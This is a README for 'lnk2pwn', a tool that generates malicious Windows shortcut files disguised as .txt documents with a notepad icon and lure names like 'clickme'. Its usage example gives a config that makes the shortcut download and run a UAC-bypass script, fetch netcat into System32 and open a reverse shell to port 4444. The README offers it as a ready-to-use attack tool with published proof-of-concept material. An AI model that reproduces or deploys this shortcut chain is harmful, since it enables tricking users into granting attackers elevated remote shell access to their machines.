# Deprecated
This tool is no longer mantainded and it has been moved to a new repository: https://github.com/it-gorillaz/lnk2pwn

# lnk2pwn
Malicious Shortcut(.lnk) Generator

## About
**lnk2pwn** is a cli tool that automates the process of generating malicious .lnk(Windows shortcut) files.

Motivation: https://medium.com/@tommelo/pwned-by-a-shortcut-b21473970944

POC: https://www.youtube.com/watch?v=-D3AaC7V0sY

## Installation
lnk2pwn requires **python2.7** and **wine** to create a Windows shortcut:

```shell
sudo apt-get install python2.7
sudo apt-get install wine
```
You can get the lastest version by clonning this repository:

```shell
git clone https://github.com/tommelo/lnk2pwn
```

## Usage

```shell
python lnk2pwn.py <options>
```

See the options overview:

Short opt | Long opt | Default | Required | Description
--------- | -------- | ------- | -------- | -----------
-g        | --generate    | True        | Yes | generates a malicious .lnk file
-c        | --config-file | config.json | Yes | the shortcut config file
-o        | --output-path | None        | Yes | the output path
-h        | --help        | None        | No  | shows the help usage
N/A       | --version     | None        | No  | shows the application's current version

## The config.json File

The project contains a template file called config.json that defines the attributes of the .lnk file:
```shell
{
    "shortcut": {
        "target_path": "C:\\Windows\\System32\\cmd.exe",
        "working_dir": "C:\\Windows\\System32",
        "arguments": "/c notepad.exe",
        "icon_path": "C:\\Windows\\System32\\notepad.exe",
        "icon_index": null,
        "window_style": "MINIMIZED",
        "description": "lnk2pwn",
        "fake_extension": ".txt",
        "file_name_prefix": "lnk2pwn"
    },

    "elevated_uac": {
        "file_name": "uac_bypass.vbs",
        "cmd": "cmd.exe"
    }
}
```
## Usage Example

Generating a malicious .lnk file that bypasses UAC, downloads and executes netcat:

config.json
```shell
{
    "shortcut": {
        "target_path": "C:\\Windows\\System32\\cmd.exe",
        "working_dir": "C:\\Windows\\System32",
        "arguments": "/c powershell.exe iwr -outf %tmp%\\p.vbs http://127.0.0.1/uac_bypass.vbs & %tmp%\\p.vbs",
        "icon_path": "C:\\Windows\\System32\\notepad.exe",
        "icon_index": null,
        "window_style": "MINIMIZED",
        "description": "trust me",
        "fake_extension": ".txt",
        "file_name_prefix": "clickme"
    },

    "elevated_uac": {
        "file_name": "uac_bypass.vbs",
        "cmd": "cmd.exe /c powershell.exe -nop -w hidden iwr -outf C:\\Windows\\System32\\nc.exe http://127.0.0.1/nc.exe & C:\\Windows\\System32\\nc.exe 127.0.0.1 4444 -e cmd.exe"
    }
}
```
Generating the files:
```shell
python lnk2pwn.py -c config.json -o /var/www/html
```

## Piped Input

You can pipe the config json content to the application:
```shell
cat config.json | python lnk2pwn.py -o /var/www/html
```

## License
This is an open-source software licensed under the [MIT license](https://opensource.org/licenses/MIT).
